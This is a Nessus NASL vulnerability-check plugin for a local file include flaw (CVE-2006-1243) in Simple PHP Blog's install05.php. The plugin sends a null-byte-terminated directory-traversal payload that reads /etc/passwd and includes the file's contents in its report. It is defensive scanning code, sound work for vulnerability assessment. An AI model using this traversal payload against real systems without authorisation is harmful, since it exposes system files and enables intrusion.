#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is affected by a
local file include flaw. 

Description :

The remote host is running Simple PHP Blog, a blog written in PHP. 

The version of Simple PHP Blog installed on the remote host fails to
sanitize input to the 'blog_language' parameter of the 'install05.php'
script before using it in a PHP 'require_once()' function.  An
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the affected host. 

See also :

http://www.milw0rm.com/exploits/1581
http://www.simplephpblog.com/index.php?entry=entry060317-173547

Solution :

Upgrade to Simple PHP Blog version 0.4.7.2 or later.

Risk factor : 

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";


if (description) {
  script_id(21082);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2006-1243");
  script_bugtraq_id(17102);

  script_name(english:"Simple PHP Blog blog_language Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read a file using Simple PHP Blog");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = make_list("/sphpblog", "/blog", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  file = "../../../../../../../../../../../../etc/passwd";
  req = http_get(
    item:string(
      dir, "/install05.php?",
      "blog_language=", file, "%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but an attacker with
    #     local access might still be able to exploit the flaw.
    egrep(pattern:"main\(languages/.+/etc/passwd\\0/strings\.php.+ failed to open stream", string:res) ||
    egrep(pattern:"Failed opening required 'languages/.+/etc/passwd\\0/strings\.php'", string:res)
  )
  {
    if (egrep(pattern:"root:.*:0:[01]:", string:res)) contents = res - strstr(res, "<br ");

    if (isnull(contents)) report = desc;
    else
    {
      report = string(
        desc,
        "\n\n",
        "Plugin output :\n",
        "\n",
        "Here are the contents of the file '/etc/passwd' that\n",
        "Nessus was able to read from the remote host :\n",
        "\n",
        contents
      );
    }

    security_warning(port:port, data:report);
    exit(0);
  }
}
